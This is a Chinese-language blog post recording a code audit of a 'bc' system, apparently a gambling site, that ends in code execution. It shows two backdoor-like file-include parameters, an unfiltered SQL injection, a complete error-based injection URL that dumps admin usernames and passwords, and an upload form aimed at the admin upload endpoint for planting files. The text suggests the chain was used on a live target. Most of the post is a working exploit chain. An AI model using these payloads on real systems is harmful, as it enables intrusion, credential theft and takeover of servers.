+++
title = "审计某bc系统实现代码执行"
author = "Hzllaga"
date =  2020-08-19 
description = "朋友发给我一个bc系统让我审计，记录下过程。"
categories = ["原创"]
tags = ["代码审计","RCE","PHP"]
+++

# 审计某bc系统实现代码执行

> 朋友发给我一个bc系统让我审计，记录下过程。

## 文件包含

360safe/360webscan.php

![](https://cdn.wtfsec.org/img/20200820105252.png)

{{< highlight php>}}
if(isset($_GET['debug']) && $_GET['debug']){
    $debug = $_GET['debug'];
    include_once($debug);
}
{{< /highlight >}}

这处感觉比较像后门，也有可能是开发者忘记删除的，利用比较简单: `?debug=file`。

m/lotto/index.php

![](https://cdn.wtfsec.org/img/20200820110734.png)

{{< highlight php>}}
if(isset($_GET['xp']) && $_GET['xp']){
    $xp = $_GET['xp'];
    include_once($xp);
}
{{< /highlight >}}

这个也感觉是后门，利用方式和上面一样。

## SQL注入

show/bk_danshi_data.php

![](https://cdn.wtfsec.org/img/20200820110957.png)

{{< highlight php>}}
if($wap == 'wap' and !empty($_GET['leaguename'])){ //手机端选择
	$sqlwhere .= ' and Match_Name = \''.$_GET['leaguename'].'\'';
}
{{< /highlight >}}

此处`$sqlwhere`直接把`$_GET['leaguename']`直接拼接到字符串里面，未经过任何过滤

![](https://cdn.wtfsec.org/img/20200820111615.png)

后面判断`$_GET['ids']`为空的话，就把`$sqlwhere`拼接到`$sql`里面带入`query`查询，跟进后发现`$mydata1_db`就是一个PDO查询，没有使用参数化查询，导致了SQL注入。

{{< highlight php>}}
$mydata1_db = new PDO('mysql:host=127.0.0.1;dbname=mydata1_db;charset=utf8', $db_user_utf8, $db_pwd_utf8, $driver_options);
{{< /highlight >}}

## 文件上传

ad888\wangEditor\upload.php

![](https://cdn.wtfsec.org/img/20200820111758.png)

{{< highlight php>}}
@session_start();
if (!isset($_SESSION['adminid'])) {
		logout_msg('您的登录已过期，请重新登录！');
}
{{< /highlight >}}
由于`$_SESSION['adminid']`不可控，所以此处只能透过上面的SQL注入来获取账号密码登陆后台上传

---

跟进后台登陆代码，可以发现登陆的SQL查询，方便我们构造payload。

{{< highlight php>}}
$stmt = $mydata1_db->prepare('select uid,quanxian,ip,about,address,login_pwd,login_name from mydata3_db.sys_admin where login_name=:login_name and login_pwd=:login_pwd limit 1');
{{< /highlight >}}

刚好目标站是开启php错误的，可以直接进行报错注入，省略许多盲注时间，Payload：

{{< highlight php>}}
/show/bk_danshi_data.php?wap=wap&leaguename=%27%20and(select%201%20from(select%20count(*),concat((select%20(select%20(SELECT%20distinct%20concat(0x23,login_name,0x3a,login_pwd,0x23)%20FROM%20mydata3_db.sys_admin%20limit%200,1))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--+
{{< /highlight >}}

![](https://cdn.wtfsec.org/img/20200820112335.png)

登陆后台后构造一个上传的表单

{{< highlight html>}}
<form action="http://website/ad888/wangEditor/upload.php"  method="POST" enctype ="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="提交">
</form>
{{< /highlight >}}

![](https://cdn.wtfsec.org/img/20200820112241.png)

![](https://cdn.wtfsec.org/img/20200820112129.png)
